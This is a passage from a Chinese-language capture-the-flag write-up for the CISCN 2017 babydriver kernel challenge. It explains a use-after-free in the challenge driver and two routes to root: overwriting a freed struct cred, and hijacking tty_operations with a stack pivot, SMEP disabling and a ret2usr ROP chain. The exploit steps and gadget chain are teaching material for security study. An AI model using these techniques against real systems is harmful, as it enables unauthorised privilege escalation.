    struct cred {
        atomic_t    usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t    subscribers;    /* number of processes subscribed */
        void        *put_addr;
        unsigned    magic;
    #define CRED_MAGIC  0x43736564
    #define CRED_MAGIC_DEAD 0x44656144
    #endif
        kuid_t      uid;        /* real UID of the task */
        kgid_t      gid;        /* real GID of the task */
        kuid_t      suid;       /* saved UID of the task */
        kgid_t      sgid;       /* saved GID of the task */
        kuid_t      euid;       /* effective UID of the task */
        kgid_t      egid;       /* effective GID of the task */
        kuid_t      fsuid;      /* UID for VFS ops */
        kgid_t      fsgid;      /* GID for VFS ops */
        unsigned    securebits; /* SUID-less security management */
        kernel_cap_t    cap_inheritable; /* caps our children can inherit */
        kernel_cap_t    cap_permitted;  /* caps we're permitted */
        kernel_cap_t    cap_effective;  /* caps we can actually use */
        kernel_cap_t    cap_bset;   /* capability bounding set */
        kernel_cap_t    cap_ambient;    /* Ambient capability set */
    #ifdef CONFIG_KEYS
        unsigned char   jit_keyring;    /* default keyring to attach requested
                         * keys to */
        struct key __rcu *session_keyring; /* keyring inherited over fork */
        struct key  *process_keyring; /* keyring private to this process */
        struct key  *thread_keyring; /* keyring private to this thread */
        struct key  *request_key_auth; /* assumed request_key authority */
    #endif
    #ifdef CONFIG_SECURITY
        void        *security;  /* subjective LSM security */
    #endif
        struct user_struct *user;   /* real user ID subscription */
        struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
        struct group_info *group_info;  /* supplementary groups for euid/fsgid */
        struct rcu_head rcu;        /* RCU deletion hook */
    } __randomize_layout;
每个进程对应于一个`struct cred`结构体，该结构体中的`uid`、`gid`等记录了进程的权限，如果可以将其修改为0，便实现了提权。
`struct cred`大小为`0xa8`（可数源码或编译一个带符号的内核进行查看）。
具体的利用步骤如下：
  1. 调用`babyopen`打开两个`babydev`设备，它们的`babydev_struct.device_buf`指向同一块内存。
  2. 调用`babyioctl`将申请大小为0xa8的内存空间。
  3. `babyrelease`释放其中一个`babydev`设备，`device_buf`被释放，但另一个`babydev`设备仍然对该空间具备读写能力。
  4. `fork`创建一个新的进程，内核会为其分配一个`struct cred`，为上面的刚刚释放的空间，所以未关闭的`babydev`拥有对这个`struct cred`空间写数据的能力。
  5. `babywrite`将0数据写到`uid`、`gid`、`suid`、`sgid`、`euid`、`egid`等字段，进行提权，返回后创建root shell。
另一个解法则是利用uaf修改结构体函数指针，实现控制程序执行流，最终实现提权。
具体的做法是利用`struct tty_struct`结构体以及`struct tty_operations`结构体，两个结构体定义如下。
`struct tty_struct`结构体定义：
    struct tty_struct {
        int magic;
        struct kref kref;
        struct device *dev;
        struct tty_driver *driver;
        const struct tty_operations *ops;
        int index;
        /* Protects ldisc changes: Lock tty not pty */
        struct ld_semaphore ldisc_sem;
        struct tty_ldisc *ldisc;
        struct mutex atomic_write_lock;
        struct mutex legacy_mutex;
        struct mutex throttle_mutex;
        struct rw_semaphore termios_rwsem;
        struct mutex winsize_mutex;
        spinlock_t ctrl_lock;
        spinlock_t flow_lock;
        /* Termios values are protected by the termios rwsem */
        struct ktermios termios, termios_locked;
        struct termiox *termiox;    /* May be NULL for unsupported */
        char name[64];
        struct pid *pgrp;       /* Protected by ctrl lock */
        struct pid *session;
        unsigned long flags;
        int count;
        struct winsize winsize;     /* winsize_mutex */
        unsigned long stopped:1,    /* flow_lock */
                  flow_stopped:1,
                  unused:BITS_PER_LONG - 2;
        int hw_stopped;
        unsigned long ctrl_status:8,    /* ctrl_lock */
                  packet:1,
                  unused_ctrl:BITS_PER_LONG - 9;
        unsigned int receive_room;  /* Bytes free for queue */
        int flow_change;
        struct tty_struct *link;
        struct fasync_struct *fasync;
        wait_queue_head_t write_wait;
        wait_queue_head_t read_wait;
        struct work_struct hangup_work;
        void *disc_data;
        void *driver_data;
        spinlock_t files_lock;      /* protects tty_files list */
        struct list_head tty_files;
    #define N_TTY_BUF_SIZE 4096
        int closing;
        unsigned char *write_buf;
        int write_cnt;
        /* If the tty has a pending do_SAK, queue it here - akpm */
        struct work_struct SAK_work;
        struct tty_port *port;
    } __randomize_layout;
`struct tty_operations`定义：
    struct tty_operations {
        struct tty_struct * (*lookup)(struct tty_driver *driver,
                struct file *filp, int idx);
        int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int  (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int  (*write)(struct tty_struct * tty,
                  const unsigned char *buf, int count);
        int  (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        int  (*write_room)(struct tty_struct *tty);
        int  (*chars_in_buffer)(struct tty_struct *tty);
        int  (*ioctl)(struct tty_struct *tty,
                unsigned int cmd, unsigned long arg);
        long (*compat_ioctl)(struct tty_struct *tty,
                     unsigned int cmd, unsigned long arg);
        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
        void (*throttle)(struct tty_struct * tty);
        void (*unthrottle)(struct tty_struct * tty);
        void (*stop)(struct tty_struct *tty);
        void (*start)(struct tty_struct *tty);
        void (*hangup)(struct tty_struct *tty);
        int (*break_ctl)(struct tty_struct *tty, int state);
        void (*flush_buffer)(struct tty_struct *tty);
        void (*set_ldisc)(struct tty_struct *tty);
        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
        void (*send_xchar)(struct tty_struct *tty, char ch);
        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
                unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
        int (*get_icount)(struct tty_struct *tty,
                    struct serial_icounter_struct *icount);
        void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
    #ifdef CONFIG_CONSOLE_POLL
        int (*poll_init)(struct tty_driver *driver, int line, char *options);
        int (*poll_get_char)(struct tty_driver *driver, int line);
        void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
    #endif
        int (*proc_show)(struct seq_file *, void *);
    } __randomize_layout;
利用uaf，控制`struct tty_struct`结构体，将该结构体中的第五个字段`const struct tty_operations
*ops`指向到我们伪造的`struct tty_operations`结构体。
`struct
tty_operations`结构体中的函数指针则是对应于相应的函数，如在用户空间调用write对该设备进行操作，最终会调用到该结构体中的`int
(*write)(struct tty_struct * tty, const unsigned char *buf, int count);`函数。
`struct tty_struct`结构体大小为`0x2e0`，打开tty设备会创建该结构体，我们可以创建`ptmx`设备实现`struct
tty_struct`结构体的创建。ptmx设备是tty设备的一种，当使用open函数打开时，通过系统调用进入内核，创建新的文件结构体，最终创建`struct
tty_struct`结构体。
将该结构体中的`ops`指针指向伪造的`const struct
tty_operations`结构体，实现在对该设备进行操作时调用相应的函数指针时，实现程序流的控制。
可以选择对设备进行`write`操作，修改`const struct tty_operations`结构体的`write`函数指针实现控制流的劫持。
能够劫持控制流后，需要做的操作包括关闭smep；ret2usr提权；返回到用户空间创建root shell。
在执行到write函数指针时，rax是指向`const struct tty_operations`结构体的，所以可以先stack
pivot来进行rop。能够进行stack pivot的gadget有两条，一条是`xchg esp, eax`；一条是`mov rsp,
rax`。第一条需要mmap一个空间，实现stack
pivot；第二个则不需要，而且第二条gadget还是两条指令的拼接，很有意思，所以在这里选择第二条gadget来进行stack pivot。
`mov rsp,rax ; dec ebx ; ret`指令的地址是`0xFFFFFFFF8181BFC5`，该地址的指令实际上是：
    pwndbg> x/3i 0xFFFFFFFF8181BFC5
       0xffffffff8181bfc5:  mov    rsp,rax
       0xffffffff8181bfc8:  dec    ebx
       0xffffffff8181bfca:  jmp    0xffffffff8181bf7e
    pwndbg> x/3i 0xffffffff8181bf7e
       0xffffffff8181bf7e:  ret
可以看到该gadget是由两条指令拼接成的`mov rsp,rax ; dec ebx ;
ret`指令，所以一开始我在`ropper`以及`ropgadget`导出来的gadget中都没有找到该指令，经过请教`V1NKe`师傅，知道了是用IDA找到的，师傅还是强。
在进行了stack
pivot后，就比较容易了，首先利用两条gadget关闭smep；可以执行用户空间代码后，ret2usr进行提权；最终返回到用户空间创建root
shell。最终的gadget链如下：
    uint64_t fake_tty_operations[30] = {
            prdi_ret,
            0x6f0,
            mov_cr4_rdi_p_ret,
            0,
            ret,
            ret,
            prdi_ret,
            mov_rsp_rax_ret,
            (uint64_t)privilege_escalate,
            swapgs_p_ret,
            0,
            iretq_ret,
            (uint64_t)root_shell,
            user_cs,
            user_rflags,
            user_sp,
            user_ss
        };
## 小结
对待问题还是要找寻本质，理清思路，解决问题。
相关脚本及文件[链接](https://github.com/ray-cp/linux_kernel_pwn/tree/master/ciscn2017_babydriver)
## 参考链接
  1. [linux漏洞缓解机制介绍](https://bbs.pediy.com/thread-226696.htm)
  2. [Linux 字符设备驱动结构（一）—— cdev 结构体、设备号相关知识解析](https://blog.csdn.net/zqixiao_09/article/details/50839042)
  3. [Linux Pwn技巧总结_1](https://xz.aliyun.com/t/4529#toc-18)
  4. [【KERNEL PWN】CISCN 2017 babydriver题解](http://p4nda.top/2018/10/11/ciscn-2017-babydriver/)